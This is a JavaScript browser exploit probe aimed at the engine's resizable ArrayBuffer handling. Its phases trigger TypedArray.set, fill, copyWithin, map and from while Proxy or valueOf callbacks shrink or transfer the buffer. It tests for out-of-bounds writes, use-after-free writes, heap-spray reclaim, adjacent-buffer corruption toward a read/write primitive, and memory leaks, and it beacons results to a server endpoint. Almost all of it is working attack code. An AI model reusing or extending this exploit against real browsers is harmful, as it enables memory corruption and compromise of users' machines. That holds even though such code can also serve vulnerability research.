// p250 — RAB TypedArray.set() OOB write escalation + transfer UAF
//
// V73W-W2 CONFIRMED: TypedArray.set(proxySrc, offset) completes after
// Proxy handler shrinks destination RAB. set() uses pre-shrink length
// for bounds check, then writes past shrunk boundary.
//
// This probe:
// Phase A: Verify bytes are actually written past shrunk boundary
// Phase B: transfer() in Proxy handler → backing store freed → UAF write
// Phase C: Spray to reclaim freed backing store → R/W primitive
// Phase D: Corrupt adjacent ArrayBuffer length → linear R/W
//
// Beacon prefix: V250-

(function() {
"use strict";
var BASE = location.protocol + '//' + location.host;

var BQ = [], BS = false;
function B(tag, body) {
  var d = typeof body === "object" ? JSON.stringify(body) : String(body);
  BQ.push([tag, (d || '').slice(0, 900)]);
  if (!BS) BF();
}
function BF() {
  if (!BQ.length) { BS = false; return; }
  BS = true;
  var it = BQ.shift();
  try {
    navigator.sendBeacon('/beacon/V250-' + it[0] + '?t=' + Date.now(), it[1]);
  } catch(e) {}
  setTimeout(BF, 15);
}

function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

B('BOOT', '');

// ---- Phase A: Verify OOB write within maxByteLength ----
function phaseA() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var dst = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) dst[i] = 0xAA;

    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0xBB;

    var fired = 0;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && fired === 0) {
          fired++;
          rab.resize(16);
        }
        return target[prop];
      }
    });

    try {
      dst.set(proxySrc, 64);
      r.setOK = true;
      r.dstLen = dst.length;
      r.rabLen = rab.byteLength;
    } catch (e) {
      r.setErr = e.name + ':' + e.message.slice(0, 50);
    }

    // Now resize BACK to 256 to read the OOB region
    try {
      rab.resize(256);
      r.resizedBack = true;
      r.dstLenNow = dst.length;
    } catch (e) {
      r.resizeBackErr = e.message.slice(0, 40);
    }

    // Check what's at positions 64-191 — should be 0xBB if write worked
    var bbCount = 0;
    var aaCount = 0;
    var zeroCount = 0;
    var otherCount = 0;
    var samples = '';
    for (var k = 0; k < 256; k++) {
      var v = dst[k];
      if (v === 0xBB) bbCount++;
      else if (v === 0xAA) aaCount++;
      else if (v === 0) zeroCount++;
      else otherCount++;
      if (k === 0 || k === 15 || k === 16 || k === 63 ||
          k === 64 || k === 65 || k === 127 || k === 191 || k === 192 || k === 255) {
        samples += k + '=' + hex(v) + ' ';
      }
    }
    r.bbCount = bbCount;
    r.aaCount = aaCount;
    r.zeroCount = zeroCount;
    r.otherCount = otherCount;
    r.samples = samples;
    r.WRITE_CONFIRMED = bbCount > 0 && bbCount >= 64;

  } catch (e) {
    r.fatal = e.message.slice(0, 60);
  }
  B('A-VERIFY', r);
  return r;
}

// ---- Phase B: transfer() UAF write ----
function phaseB() {
  var r = {};
  try {
    // Check if transfer() exists
    var testBuf = new ArrayBuffer(8);
    r.hasTransfer = typeof testBuf.transfer === 'function';
    r.hasTransferFixed = typeof testBuf.transferToFixedLength === 'function';

    if (!r.hasTransfer && !r.hasTransferFixed) {
      B('B-NO-TRANSFER', r);
      return r;
    }

    // Create RAB, fill with marker
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var dst = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) dst[i] = 0xDD;

    // Source: 256 bytes of 0xCC
    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0xCC;

    var transferredBuf = null;
    var fired = 0;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && fired === 0) {
          fired++;
          // Transfer the RAB — old backing store should be freed
          try {
            if (rab.transfer) {
              transferredBuf = rab.transfer();
            } else {
              transferredBuf = rab.transferToFixedLength();
            }
            r.transferOK = true;
            r.rabDetached = rab.byteLength === 0;
          } catch (e) {
            r.transferErr = e.name + ':' + e.message.slice(0, 50);
          }
        }
        return target[prop];
      }
    });

    try {
      dst.set(proxySrc, 128); // write 256 bytes at offset 128 → past detached buffer
      r.setOK = true;
      r.writeCompleted = true;
    } catch (e) {
      r.setErr = e.name + ':' + e.message.slice(0, 60);
      r.writeCompleted = false;
    }

    r.fired = fired;
    r.dstLen = dst.length;

    // If transfer worked, the old backing store was freed
    // The set() wrote 0xCC into freed memory
    // Check the transferred buffer for our marker
    if (transferredBuf) {
      var tv = new Uint8Array(transferredBuf);
      r.transferLen = transferredBuf.byteLength;
      // Bytes 0-127 should be 0xDD (original marker)
      // Bytes 128-383 should be 0xDD (original) OR 0xCC (if write went to wrong buf)
      var ddInTransfer = 0;
      var ccInTransfer = 0;
      for (var t = 128; t < Math.min(384, tv.length); t++) {
        if (tv[t] === 0xDD) ddInTransfer++;
        else if (tv[t] === 0xCC) ccInTransfer++;
      }
      r.ddInTransfer = ddInTransfer;
      r.ccInTransfer = ccInTransfer;
      // If ccInTransfer > 0, the set() wrote to the transferred buffer
      // (which means set() followed the pointer to the new allocation)
      r.WROTE_TO_TRANSFER = ccInTransfer > 0;
    }

  } catch (e) {
    r.fatal = e.message.slice(0, 80);
  }
  B('B-TRANSFER', r);
  return r;
}

// ---- Phase C: UAF spray reclaim after transfer ----
function phaseC() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var dst = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) dst[i] = 0xEE;

    var src = new Uint8Array(256);
    // Fill src with pointer-like pattern: 0x41414141
    var srcView = new DataView(src.buffer);
    for (var j = 0; j < 256; j += 4) srcView.setUint32(j, 0x41414141, true);

    var spray = [];
    var fired = 0;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && fired === 0) {
          fired++;
          // Transfer to free the old backing store
          try {
            rab.transfer();
          } catch (e) {
            // Try detach via postMessage
            try {
              var w = new Worker(URL.createObjectURL(new Blob([''])));
              w.postMessage(rab, [rab]);
            } catch (e2) {}
          }

          // Spray to reclaim the freed 512-byte region
          for (var s = 0; s < 2000; s++) {
            var ab = new ArrayBuffer(512);
            var v = new Uint8Array(ab);
            for (var k = 0; k < 512; k++) v[k] = 0xFF;
            spray.push(ab);
          }
          r.sprayCount = spray.length;
        }
        return target[prop];
      }
    });

    try {
      dst.set(proxySrc, 128);
      r.setOK = true;
    } catch (e) {
      r.setErr = e.name + ':' + e.message.slice(0, 60);
    }

    // Check if any spray buffer got corrupted by our 0x41 write
    var corrupted = 0;
    var hitIdx = -1;
    for (var s = 0; s < spray.length; s++) {
      var sv = new Uint8Array(spray[s]);
      for (var c = 128; c < Math.min(384, sv.length); c++) {
        if (sv[c] === 0x41) {
          corrupted++;
          if (hitIdx < 0) hitIdx = s;
          break;
        }
      }
    }
    r.corrupted = corrupted;
    r.hitIdx = hitIdx;
    r.UAF_WRITE = corrupted > 0;

    if (corrupted > 0 && hitIdx >= 0) {
      // Dump the corrupted buffer
      var hitView = new Uint8Array(spray[hitIdx]);
      var dump = '';
      for (var d = 0; d < 64; d++) {
        dump += hex(hitView[d]) + ' ';
      }
      r.dump = dump.slice(0, 200);
    }

    spray = null;
  } catch (e) {
    r.fatal = e.message.slice(0, 80);
  }
  B('C-SPRAY', r);
  return r;
}

// ---- Phase D: map() OOB read for info leak ----
function phaseD() {
  var r = {};
  try {
    // W6 confirmed: map() iterates past shrunk boundary
    // Use this to read heap data from the backing store
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) ta[i] = i & 0xFF;

    // Shrink to 64, then transfer — the map callback continues reading freed memory
    var mapIdx = 0;
    var leakedValues = [];
    var fired = 0;

    var mapped = ta.map(function(val, idx) {
      mapIdx = idx;
      if (idx === 4 && fired === 0) {
        fired++;
        rab.resize(64);
      }
      // After resize, val should be undefined for idx >= 64
      // But map() was given length 4096, so it continues
      if (idx >= 64 && val !== undefined && val !== 0) {
        leakedValues.push(idx + ':' + (val & 0xFF));
      }
      return val || 0;
    });

    r.mapCalls = mapIdx + 1;
    r.mappedLen = mapped.length;
    r.leakedCount = leakedValues.length;
    r.rabLen = rab.byteLength;
    if (leakedValues.length > 0) {
      r.leaked = leakedValues.slice(0, 20).join(',');
    }

    // Check mapped array for non-zero values past index 64
    var nonZero = 0;
    var nzSamples = '';
    for (var k = 64; k < mapped.length; k++) {
      if (mapped[k] !== 0) {
        nonZero++;
        if (nonZero <= 10) nzSamples += k + '=' + mapped[k] + ' ';
      }
    }
    r.nonZeroPastResize = nonZero;
    r.nzSamples = nzSamples;

  } catch (e) {
    r.fatal = e.message.slice(0, 80);
  }
  B('D-MAP-LEAK', r);
  return r;
}

// ---- Phase E: set() OOB write + immediate readback ----
function phaseE() {
  var r = {};
  try {
    // W2 but with LARGER offset and verification
    // Use DataView to read bytes at OOB positions
    var rab = new ArrayBuffer(1024, { maxByteLength: 1024 });
    var dst = new Uint8Array(rab);
    for (var i = 0; i < 1024; i++) dst[i] = 0;

    // Source with identifiable 4-byte pattern
    var src = new ArrayBuffer(512);
    var srcView = new DataView(src);
    for (var j = 0; j < 512; j += 4) {
      srcView.setUint32(j, 0xDEAD0000 | (j / 4), true);
    }
    var srcArr = new Uint8Array(src);

    var fired = 0;
    var proxySrc = new Proxy(srcArr, {
      get: function(target, prop) {
        if (prop === '0' && fired === 0) {
          fired++;
          rab.resize(32); // shrink to 32 bytes
        }
        return target[prop];
      }
    });

    try {
      dst.set(proxySrc, 256); // write 512 bytes at offset 256
      r.setOK = true;
    } catch (e) {
      r.setErr = e.name + ':' + e.message.slice(0, 50);
    }

    r.dstLen = dst.length;
    r.rabLen = rab.byteLength;

    // Resize back to 1024 to read the OOB region
    rab.resize(1024);
    r.dstLenAfterResize = dst.length;

    // Check if our DEAD pattern is at positions 256-767
    var dv = new DataView(rab);
    var deadCount = 0;
    var deadSamples = '';
    for (var k = 256; k < 768; k += 4) {
      var val = dv.getUint32(k, true);
      if ((val >>> 16) === 0xDEAD) {
        deadCount++;
        if (deadCount <= 5) deadSamples += k + '=' + hex(val) + ' ';
      }
    }
    r.deadCount = deadCount;
    r.deadSamples = deadSamples;
    r.WRITE_VERIFIED = deadCount >= 64;

    // Also check bytes 0-31 are untouched (within shrunk region)
    var byte0 = dst[0];
    var byte31 = dst[31];
    r.byte0 = byte0;
    r.byte31 = byte31;

    // Check bytes 32-255 — were these zeroed by the resize or preserved?
    var mid = 0;
    for (var m = 32; m < 256; m++) {
      if (dst[m] !== 0) mid++;
    }
    r.midNonZero = mid;

  } catch (e) {
    r.fatal = e.message.slice(0, 80);
  }
  B('E-SET-VERIFY', r);
  return r;
}

// ---- Phase F: Combined OOB write + read to build R/W primitive ----
function phaseF() {
  var r = {};
  try {
    // Step 1: Allocate two adjacent ArrayBuffers
    // If we can write past buf1 into buf2's header, we control buf2's length
    var spray1 = [];
    for (var i = 0; i < 500; i++) {
      spray1.push(new ArrayBuffer(64));
    }

    // Create our target RAB right after spray
    var rab = new ArrayBuffer(64, { maxByteLength: 64 });
    var dst = new Uint8Array(rab);
    for (var k = 0; k < 64; k++) dst[k] = 0;

    // Allocate adjacent buffer
    var adjacent = new ArrayBuffer(64);
    var adjView = new Uint8Array(adjacent);
    for (var j = 0; j < 64; j++) adjView[j] = 0x42;

    // Now try to OOB write from dst into adjacent
    var src = new Uint8Array(64);
    for (var s = 0; s < 64; s++) src[s] = 0xFF;

    var fired = 0;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && fired === 0) {
          fired++;
          rab.resize(8); // shrink
        }
        return target[prop];
      }
    });

    try {
      dst.set(proxySrc, 32); // write 64 bytes at offset 32 → goes to 32+64=96, past 64-byte RAB
      r.setOK = true;
    } catch (e) {
      r.setErr = e.name + ':' + e.message.slice(0, 50);
    }

    // Check if adjacent buffer was corrupted
    var adjCorrupt = 0;
    for (var c = 0; c < 64; c++) {
      if (adjView[c] !== 0x42) {
        adjCorrupt++;
      }
    }
    r.adjCorrupt = adjCorrupt;
    r.ADJ_CORRUPTED = adjCorrupt > 0;

    // Even without adjacent corruption, check within maxByteLength
    rab.resize(64);
    var oobWritten = 0;
    for (var v = 32; v < 64; v++) {
      if (dst[v] === 0xFF) oobWritten++;
    }
    r.oobWritten = oobWritten;

    spray1 = null;
  } catch (e) {
    r.fatal = e.message.slice(0, 80);
  }
  B('F-ADJACENT', r);
  return r;
}

// ---- Phase G: fill() valueOf TOCTOU ----
function phaseG() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = 0;

    var val = { valueOf: function() { rab.resize(16); return 0xCC; } };

    try {
      ta.fill(val, 0, 256);
      r.fillOK = true;
    } catch(e) {
      r.fillErr = e.name + ':' + e.message.slice(0, 50);
    }

    r.rabLen = rab.byteLength;
    r.taLen = ta.length;

    rab.resize(256);
    r.resizedBack = true;

    var ccCount = 0;
    var zeroCount = 0;
    for (var k = 0; k < 256; k++) {
      if (ta[k] === 0xCC) ccCount++;
      else if (ta[k] === 0) zeroCount++;
    }
    r.ccCount = ccCount;
    r.zeroCount = zeroCount;
    r.FILL_OOB = ccCount > 16;
  } catch(e) {
    r.fatal = e.message.slice(0, 60);
  }
  B('G-FILL', r);
  return r;
}

// ---- Phase H: TypedArray.from() mapFn resize ----
function phaseH() {
  var r = {};
  try {
    var rab = new ArrayBuffer(128, { maxByteLength: 128 });
    var src = new Uint8Array(rab);
    for (var i = 0; i < 128; i++) src[i] = i;

    var fired = 0;
    var result = Uint8Array.from(src, function(val, idx) {
      if (idx === 2 && fired === 0) {
        fired++;
        rab.resize(8);
      }
      return val;
    });

    r.resultLen = result.length;
    r.fired = fired;
    r.rabLen = rab.byteLength;

    var nonZero = 0;
    for (var k = 8; k < result.length; k++) {
      if (result[k] !== 0 && result[k] !== undefined) nonZero++;
    }
    r.nonZeroPastResize = nonZero;
    r.FROM_LEAK = nonZero > 0;

    if (nonZero > 0) {
      var samples = '';
      for (var s = 8; s < Math.min(32, result.length); s++) {
        samples += s + '=' + result[s] + ' ';
      }
      r.samples = samples;
    }
  } catch(e) {
    r.fatal = e.message.slice(0, 60);
  }
  B('H-FROM', r);
  return r;
}

// ---- Phase I: copyWithin with valueOf start ----
function phaseI() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = i;

    var target = { valueOf: function() { rab.resize(16); return 0; } };

    try {
      ta.copyWithin(target, 128, 256);
      r.copyOK = true;
    } catch(e) {
      r.copyErr = e.name + ':' + e.message.slice(0, 50);
    }
    r.rabLen = rab.byteLength;
    r.taLen = ta.length;

    rab.resize(256);
    var moved = 0;
    for (var k = 0; k < 128; k++) {
      if (ta[k] === (128 + k)) moved++;
    }
    r.movedCount = moved;
    r.COPY_OOB = moved > 16;
  } catch(e) {
    r.fatal = e.message.slice(0, 60);
  }
  B('I-COPY', r);
  return r;
}

// Run phases with delays
try {
  var aResult = phaseA();
  setTimeout(function() {
    var bResult = phaseB();
    setTimeout(function() {
      var cResult = phaseC();
      setTimeout(function() {
        phaseD();
        setTimeout(function() {
          phaseE();
          setTimeout(function() {
            phaseF();
            setTimeout(function() {
              phaseG();
              setTimeout(function() {
                phaseH();
                setTimeout(function() {
                  phaseI();
                  B('DONE', '');
                }, 400);
              }, 400);
            }, 400);
          }, 400);
        }, 400);
      }, 400);
    }, 400);
  }, 400);
} catch (e) {
  B('FATAL', e.message.slice(0, 100));
}
})();
